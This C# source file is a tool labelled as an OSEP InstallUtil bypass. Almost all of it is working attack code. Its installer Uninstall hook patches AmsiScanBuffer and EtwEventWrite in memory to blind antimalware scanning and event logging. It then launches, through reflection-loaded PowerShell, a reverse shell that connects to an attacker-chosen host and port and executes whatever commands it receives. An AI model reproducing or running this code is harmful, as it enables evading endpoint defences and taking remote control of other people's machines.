using System;
using System.Configuration.Install;
using System.Text;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Collections;

namespace OSEP
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("OSEP InstallUtil Bypass Tool (Surgical Reflection Edition)");
            Console.WriteLine("Usage: installutil.exe /U /LHOST=<IP> /LPORT=<PORT> <this_exe>");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtilBypass : System.Configuration.Install.Installer
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        static void StealthInit()
        {
            try {
                IntPtr hAmsi = GetModuleHandle("amsi.dll");
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi != IntPtr.Zero) {
                    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                    uint oldProtect;
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, 0x40, out oldProtect);
                    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                    VirtualProtect(pAmsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                }
            } catch { }

            try {
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                byte[] patch = { 0xC2, 0x14, 0x00 }; // ret 14
                uint oldProtect;
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            } catch { }
        }

        static MethodInfo GetMethodSurgical(Type type, string name, Type[] parameterTypes)
        {
            try {
                return type.GetMethod(name, BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance, null, parameterTypes, null);
            } catch {
                foreach (var m in type.GetMethods()) {
                    if (m.Name == name && !m.IsGenericMethod) {
                        var ps = m.GetParameters();
                        if (ps.Length == parameterTypes.Length) {
                            bool match = true;
                            for (int i = 0; i < ps.Length; i++) {
                                if (ps[i].ParameterType != parameterTypes[i]) { match = false; break; }
                            }
                            if (match) return m;
                        }
                    }
                }
            }
            return null;
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            StealthInit();

            string lhost = Context.Parameters["LHOST"];
            string lport = Context.Parameters["LPORT"];

            if (string.IsNullOrEmpty(lhost) || string.IsNullOrEmpty(lport))
            {
                lhost = "127.0.0.1";
                lport = "4444";
            }

            string revShell = @"
                $client = New-Object System.Net.Sockets.TcpClient('" + lhost + @"'," + lport + @");
                $stream = $client.GetStream();
                [byte[]]$bytes = 0..65535|%{0};
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                    $sendback = (iex $data 2>&1 | Out-String );
                    $prompt = $sendback + 'PS ' + (pwd).Path + '> ';
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($prompt);
                    $stream.Write($sendbyte,0,$sendbyte.Length);
                    $stream.Flush();
                }
                $client.Close();";

            try
            {
                var automation = Assembly.Load("System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                var runspaceFactoryType = automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory");
                var runspaceType = automation.GetType("System.Management.Automation.Runspaces.Runspace");
                var powerShellType = automation.GetType("System.Management.Automation.PowerShell");

                var createRS = GetMethodSurgical(runspaceFactoryType, "CreateRunspace", new Type[0]);
                var runspace = createRS.Invoke(null, null);
                
                var openRS = GetMethodSurgical(runspaceType, "Open", new Type[0]);
                openRS.Invoke(runspace, null);

                var createPS = GetMethodSurgical(powerShellType, "Create", new Type[0]);
                var ps = createPS.Invoke(null, null);

                powerShellType.GetProperty("Runspace").SetValue(ps, runspace);
                
                var addScript = GetMethodSurgical(powerShellType, "AddScript", new Type[] { typeof(string) });
                addScript.Invoke(ps, new object[] { revShell });
                
                var beginInvoke = GetMethodSurgical(powerShellType, "BeginInvoke", new Type[0]);
                beginInvoke.Invoke(ps, null);

                System.Threading.Thread.Sleep(2000);
            }
            catch (Exception) { }
        }
    }
}
